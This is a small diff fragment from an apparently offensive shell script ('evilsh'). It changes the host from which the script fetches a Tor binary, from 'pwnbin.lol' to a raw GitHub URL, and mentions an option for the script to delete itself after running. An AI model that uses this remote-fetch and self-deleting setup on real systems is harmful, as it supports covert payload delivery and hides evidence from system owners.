@@ -54,7 +54,7 @@ echo '######################################'
 }
 
 # Edit these:
-host=pwnbin.lol
+host="https://github.com/isdrupter/evilsh/raw/master/tor-i686"
 torBin=tor-i686
 
 # Pass -d or --delete on the cli to delete this script afterwards
